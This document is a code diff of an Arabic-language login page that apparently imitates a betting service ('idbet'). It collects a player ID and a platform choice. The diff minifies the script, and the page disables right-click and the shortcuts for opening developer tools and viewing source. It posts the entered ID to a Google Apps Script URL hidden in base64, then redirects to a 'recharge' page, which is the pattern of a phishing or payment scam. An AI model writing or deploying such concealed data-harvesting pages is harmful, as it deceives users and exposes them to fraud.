@@ -19,9 +19,6 @@
       font-family: 'Tajawal', sans-serif;
       background: #f5f5f5;
       color: #333;
-      -webkit-user-select: none;
-      -moz-user-select: none;
-      -ms-user-select: none;
       user-select: none;
     }
     header {
@@ -83,21 +80,140 @@
       align-items: center;
       justify-content: center;
     }
+    .input-label {
+      margin-bottom: 6px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .info-icon {
+      width: 20px;
+      height: 20px;
+      border: 2px solid #666;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.95rem;
+      cursor: help;
+      color: #666;
+      transition: all 0.3s ease;
+    }
+    .info-icon:hover {
+      border-color: var(--idbet-color);
+      background: rgba(229, 9, 20, 0.08);
+      color: var(--idbet-color);
+    }
+    .input-group {
+      margin-bottom: 12px;
+    }
+    .input-wrapper {
+      position: relative;
+    }
+    .input-wrapper input {
+      width: 100%;
+      padding: 8px;
+      font-size: 0.95rem;
+      border: 1px solid #bbb;
+      border-radius: 6px;
+      outline: none;
+      padding-left: 40px;
+    }
+    .status-icon {
+      position: absolute;
+      left: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      display: none;
+      align-items: center;
+      justify-content: center;
+    }
+    .status-spinner {
+      border: 2px solid #ccc;
+      border-top: 2px solid var(--idbet-color);
+      animation: spin 0.8s linear infinite;
+    }
+    .status-check {
+      background: #28a745;
+      color: white;
+      font-size: 12px;
+    }
+    .error-message {
+      font-size: 0.8rem;
+      margin-top: 4px;
+      min-height: 18px;
+      text-align: center;
+      color: #d32f2f;
+    }
+    .platform-icons {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+      margin: 16px 0 18px;
+    }
+    .icon {
+      position: relative;
+      width: 85px;
+      height: 85px;
+      border-radius: 12px;
+      background: #fff;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, .04);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 8px;
+      border: 1px solid #eee;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .icon:hover {
+      background-color: #fafafa;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, .08);
+    }
+    .icon.selected {
+      border-color: var(--idbet-color);
+      box-shadow: 0 0 8px rgba(229, 9, 20, .3);
+    }
+    .icon.selected::after {
+      content: "✓";
+      position: absolute;
+      top: 5px;
+      left: 5px;
+      width: 18px;
+      height: 18px;
+      background: var(--idbet-color);
+      color: #fff;
+      border-radius: 50%;
+      font-size: 11px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .icon img {
+      height: 40px;
+      max-width: 80%;
+      object-fit: contain;
+    }
+    .icon-name {
+      margin-top: 6px;
+      font-size: 0.8rem;
+      color: #222;
+      text-align: center;
+    }
   </style>
   <script>
-    document.addEventListener("contextmenu", e => e.preventDefault());
-    document.addEventListener("keydown", e => {
-      if (e.key === "F12" || (e.ctrlKey && (e.key === "u" || e.key === "s"))) {
-        e.preventDefault();
+    // تعطيل زر الفأرة الأيمن واختصارات فحص الكود
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.onkeydown = function (e) {
+      if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'u')) {
+        e.preventDefault(); return false;
       }
-    });
-    (function () {
-      const start = Date.now();
-      setInterval(() => {
-        const duration = Date.now() - start;
-        if (duration > 2000) window.location.href = "about:blank";
-      }, 1000);
-    })();
+    };
   </script>
 </head>
 <body>
@@ -137,101 +253,67 @@
 </main>
 
 <script>
-  const input = document.getElementById('player-id-1');
-  const errMsg = document.getElementById('error-message');
-  const btn = document.getElementById('login-btn');
-  const icons = document.querySelectorAll('.icon');
-  const statusIcon = document.getElementById('status-icon');
-  let platform = null;
-  const repReg = /^(\d)\1{6,}$/;
-
-  input.addEventListener('keydown', e => {
-    const ok = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'];
-    if (!ok.includes(e.key) && !/^\d$/.test(e.key)) e.preventDefault();
+(function(){
+  const i=document.getElementById('player-id-1'),
+        e=document.getElementById('error-message'),
+        t=document.getElementById('login-btn'),
+        n=document.querySelectorAll('.icon'),
+        s=document.getElementById('status-icon');
+  let r=null;
+  const o=/^(\d)\1{6,}$/;
+  i.addEventListener('keydown',a=>{
+    const d=['Backspace','Delete','ArrowLeft','ArrowRight','Tab'];
+    if(!d.includes(a.key)&&!/^\d$/.test(a.key))a.preventDefault();
   });
-
-  input.addEventListener('input', validate);
-
-  icons.forEach(icon => {
-    icon.addEventListener('click', () => {
-      icons.forEach(i => i.classList.remove('selected'));
-      icon.classList.add('selected');
-      platform = icon.dataset.name;
-      validate();
+  i.addEventListener('input',l);
+  n.forEach(c=>{
+    c.addEventListener('click',()=>{
+      n.forEach(f=>f.classList.remove('selected'));
+      c.classList.add('selected');r=c.dataset.name;l();
     });
   });
-
-  function validate() {
-    const val = input.value.replace(/\D/g, '');
-    input.value = val;
-    errMsg.textContent = '';
-    btn.disabled = true;
-
-    if (val.length < 7) {
-      statusIcon.style.display = 'none';
-      statusIcon.className = 'status-icon';
-      statusIcon.innerHTML = '';
-      return;
+  function l(){
+    const a=i.value.replace(/\D/g,'');
+    i.value=a;e.textContent='';t.disabled=true;
+    if(a.length<7){
+      s.style.display='none';s.className='status-icon';s.innerHTML='';return;
     }
-
-    statusIcon.style.display = 'flex';
-    statusIcon.className = 'status-icon status-spinner';
-    statusIcon.innerHTML = '';
-
-    setTimeout(() => {
-      if (repReg.test(val)) {
-        errMsg.textContent = 'المعرّف غير صالح';
-        statusIcon.style.display = 'none';
-        return;
-      }
-      if (!platform) {
-        errMsg.textContent = 'يرجى اختيار المنصة.';
-        statusIcon.style.display = 'none';
-        return;
-      }
-
-      btn.disabled = false;
-      statusIcon.className = 'status-icon status-check';
-      statusIcon.innerHTML = '✓';
-    }, 500);
+    s.style.display='flex';s.className='status-icon status-spinner';s.innerHTML='';
+    setTimeout(()=>{
+      if(o.test(a)){e.textContent='المعرّف غير صالح';s.style.display='none';return;}
+      if(!r){e.textContent='يرجى اختيار المنصة.';s.style.display='none';return;}
+      t.disabled=false;s.className='status-icon status-check';s.innerHTML='✓';
+    },500);
   }
-</script>
-  btn.addEventListener('click', async () => {
-    btn.innerHTML = '<span class="btn-spinner"></span> جارٍ التحقق...';
-    btn.disabled = true;
 
-    const encryptedURL = atob("aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J6UVhxZllLM3J6U1NSLVpLWUR4c2ExaXFULVVwZmZsSG5EWlFWblUzaEt4Tm9MR0owM2dQTzBLSWlqSDVZWmVsUWczQS9leGVj");
-    const payload = { userId: input.value, platform: platform };
+  const encrypted = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J6UVhxZllLM3J6U1NSLVpLWUR4c2ExaXFUNVVwZmZsSG5EWlFWblUzaEt4Tm9MR0owM2dQTzBLSWlqSDVZWmVsUWczQS9leGVj";
+  const apiURL = atob(encrypted);
 
-    try {
-      await fetch(encryptedURL, {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
+  t.addEventListener('click',async()=>{
+    t.innerHTML='<span class="btn-spinner"></span> جارٍ التحقق...';t.disabled=true;
+    const p={userId:i.value,platform:r};
+    try{
+      await fetch(apiURL,{
+        method:'POST',
+        mode:'no-cors',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify(p)
       });
-      setTimeout(() => {
-        localStorage.setItem('userId', input.value);
-        window.location.replace('fr/office/recharge.html');
-      }, 1200);
-    } catch (err) {
-      errMsg.textContent = 'حدث خطأ أثناء التحقق، حاول مجددًا.';
-      btn.innerHTML = 'تسجيل الدخول';
-      btn.disabled = false;
+      setTimeout(()=>{
+        localStorage.setItem('userId',i.value);
+        window.location.href='fr/office/recharge.html';
+      },1200);
+    }catch(u){
+      e.textContent='حدث خطأ أثناء التحقق، حاول مجددًا.';t.innerHTML='تأكيد';t.disabled=false;
     }
   });
 
-  window.addEventListener('pageshow', () => {
-    btn.disabled = true;
-    btn.innerHTML = 'تسجيل الدخول';
-    errMsg.textContent = '';
-    input.value = '';
-    platform = null;
-    statusIcon.style.display = 'none';
-    statusIcon.className = 'status-icon';
-    statusIcon.innerHTML = '';
-    icons.forEach(i => i.classList.remove('selected'));
+  window.addEventListener('pageshow',()=>{
+    t.disabled=true;t.innerHTML='تأكيد';e.textContent='';i.value='';r=null;
+    s.style.display='none';s.className='status-icon';s.innerHTML='';
+    n.forEach(g=>g.classList.remove('selected'));
   });
+})();
 </script>
 
 </body>
